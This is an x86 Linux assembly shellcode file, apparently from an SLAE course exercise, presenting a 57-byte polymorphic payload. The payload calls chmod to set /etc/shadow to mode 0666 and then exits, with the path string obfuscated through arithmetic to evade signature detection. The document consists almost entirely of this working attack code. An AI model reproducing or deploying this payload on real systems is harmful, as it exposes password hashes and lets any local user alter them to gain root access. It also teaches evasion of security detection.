; Title: chmod 666 "/etc/shadow" Polymorphic Shellcode - 57 byte
; Platform: linux/x86
; Date: 2015-01-18
; Author: Dennis 'dhn' Herrmann
; Website: https://zer0-day.pw
; Github: https://github.com/dhn/SLAE/
; SLAE-721
;
; The orignal shellcode is implemented by:
; <root@thegibson>

BITS 32

section .text
global _start

_start:
	; chmod("//etc/shadow", 0666);
	mov ebx, eax                    ; change ebx to eax
	xor eax, ebx                    ; clean eax
	push eax                        ; push eax
	mov DWORD [esp-0x7], 0x776f6461 ; obfuscated version of:
	sub esp, 0x7                    ; push dword 0x776f6461
	mov esi, 0x46331674             ; obfuscated version of:
	add esi, 0x224018ef             ; push dword 0x68732f63
	push esi                        ; push esi to the stack
	mov esi, 0x96a5481e             ; obfuscated version of:
	sub esi, 0x224018ef             ; push dword 0x74652f2f
	push esi                        ; push esi to the stack
	mov ebx, esp                    ; save pointer to ebx
	mov ecx, 0x1b6                  ; permission: 666
	mov al, 0x0f                    ; syscall 0x0f -> chmod()
	int 0x80                        ; syscall chmod()

exit:
	xor eax, eax                    ; clean eax
	mov al, 0x01                    ; syscall 0x01 -> exit()
	int 0x80                        ; syscall exit()
